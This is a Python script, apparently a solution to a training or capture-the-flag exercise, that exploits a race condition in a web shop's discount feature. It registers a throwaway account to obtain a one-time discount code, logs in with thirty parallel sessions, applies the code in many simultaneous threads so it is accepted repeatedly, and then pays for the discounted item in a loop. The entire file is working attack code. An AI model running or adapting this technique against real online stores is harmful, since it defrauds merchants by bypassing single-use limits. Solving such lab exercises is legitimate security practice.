import requests
import threading
import string
import random

base_url = "http://discount.training.offdef.it"

def register(username, password, s):
    url = "%s/register" % base_url
    data = {'username': username, 'password': password}
    r = s.post(url, data=data)
    r_text = r.text
    start_tag = '<div class="alert alert-warning" role="alert">'
    end_tag = '</div>'
    start_index = r_text.find(start_tag) + len(start_tag) + len("Use your discount code! Code: ")
    end_index = r_text.find(end_tag, start_index)
    discount_code = r_text[start_index:end_index]
    return discount_code

def login(username, password, s):
    url = "%s/login" % base_url
    data = {'username': username, 'password': password}
    r = s.post(url, data=data)

def apply_discount(discount_code, s):
    url = "%s/apply_discount" % base_url
    data = {'discount': discount_code}
    r = s.post(url, data=data)

def add_to_cart(item_id, s):
    url = "%s/add_to_cart?item_id=21" % base_url
    data = {'item_id': item_id}
    r = s.get(url, data=data)

def pay(s):
    url = "%s/cart/pay" % base_url
    r = s.get(url)
    if "Payment was sucessful!" in r.text:
        print(r.text)

num_sessions = 30 #at least 11 people are necessary to have a cost < 5 euros
i = 0
sessions = []

while True:
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    password = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    
    while i < num_sessions:
        s = requests.Session()
        sessions.append(s)
        i = i + 1
    discount_code = register(username, password, sessions[0])
    add_to_cart("21", sessions[0])
    print(discount_code)
    i = 1

    while i < num_sessions:
        login(username, password, sessions[i])
        add_to_cart("21", sessions[i])
        i = i + 1
    
    i = 0
    threads = []
    while i < num_sessions:
        t = threading.Thread(target=apply_discount, args=(discount_code, sessions[i]))
        threads.append(t)
        i = i + 1
# --- START CRITICAL PHASE
    i = 0
    while i < num_sessions:
        threads[i].start()
        i = i + 1
    
    i = 0
    while i < num_sessions:
        threads[i].join()
        i = i + 1
# --- END CRITICAL PHASE
    i = 0
    while i < num_sessions:
        pay(sessions[i])
        i = i + 1